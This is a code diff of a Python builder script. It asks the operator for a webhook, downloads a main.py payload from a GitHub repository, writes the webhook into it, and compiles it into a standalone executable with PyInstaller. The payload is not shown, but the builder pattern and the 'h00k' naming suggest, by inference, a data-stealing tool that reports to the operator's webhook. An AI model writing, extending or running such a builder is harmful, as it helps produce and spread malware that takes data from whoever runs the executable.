@@ -4,12 +4,14 @@ from colorama import Fore
 import os
 import shutil
 import pyfiglet
+import requests
 from pystyle import Center
 
 colorama.init(autoreset=True)
 os.system("cls" if os.name == "nt" else "clear")
 
-target_file = "Component/main.py"
+target_file = "src/asset/main.py"
+download_url = "https://raw.githubusercontent.com/zakocord/Astryrean/refs/heads/main/build/Component/main.py"
 
 class Debug:
     ANSI_COLORS = {
@@ -23,7 +25,7 @@ class Debug:
 
     def input(self, name: str, prefix: str = "?", default: str = "", color: str = "white") -> str:
         color_code = self.ANSI_COLORS.get(color.lower(), self.ANSI_COLORS["white"])
-        prompt = f"{self.ANSI_COLORS['reset']}{self.ANSI_COLORS['bright_blue']}{prefix}{self.ANSI_COLORS['reset']} \033[0m{name}{self.ANSI_COLORS['reset']}{color_code} "
+        prompt = f"{self.ANSI_COLORS['reset']}{self.ANSI_COLORS['bright_blue']}{prefix}{self.ANSI_COLORS['reset']} {name}{self.ANSI_COLORS['reset']}{color_code} "
         value = input(prompt)
         return value if value.strip() else default
 
@@ -32,6 +34,18 @@ class Debug:
         print(f"{color_code}{logs}{self.ANSI_COLORS['reset']}")
 
 console = Debug()
+
+def download_file(url, destination):
+    try:
+        console.log(f"[INFO] Not found: {target_file} Download ", "bright_yellow")
+        response = requests.get(url)
+        response.raise_for_status()
+        os.makedirs(os.path.dirname(destination), exist_ok=True)
+        with open(destination, "wb") as f:
+            f.write(response.content)
+        console.log("[+] Succesfully Downloaded Files", "bright_green")
+    except Exception as e:
+        console.log(f"[-] Download Faild: {e}", "bright_red")
 
 def get_user_input():
     h00k = console.input("Enter Your Webhook:", prefix="!", color="bright_red")
@@ -50,6 +64,9 @@ def get_user_input():
     }
 
 def update_main_py(settings):
+    if not os.path.exists(target_file):
+        download_file(download_url, target_file)
+
     try:
         with open(target_file, "r", encoding="utf-8") as f:
             lines = f.readlines()
@@ -77,13 +94,11 @@ def update_main_py(settings):
         for i, line in enumerate(lines):
             if line.strip().startswith("h00k ="):
                 lines[i] = f'h00k = "{settings["h00k"]}"\n'  
-            elif line.strip().startswith("types ="):
-                lines[i] = f'types = "{settings["types"]}"\n'  
 
         with open(target_file, "w", encoding="utf-8") as f:
             f.writelines(lines)
 
-        console.log("[+] successfully Replace", color="bright_green")
+        console.log("[+] successfully replaced main.py", color="bright_green")
     except Exception as e:
         console.log(f"[-] Failed to update main.py: {e}", color="bright_red")
 
@@ -98,7 +113,7 @@ def install_pyinstaller():
 def build_exe():
     console.log("[*] Starting build process...", color="bright_magenta")
     try:
-        subprocess.run(["pyinstaller", "--onefile", "Component/main.py"], check=True)
+        subprocess.run(["pyinstaller", "--onefile", target_file], check=True)
         console.log("[+] Executable built successfully.", color="bright_green")
     except Exception as e:
         console.log(f"[+] Failed to build executable: {e}", color="bright_red")
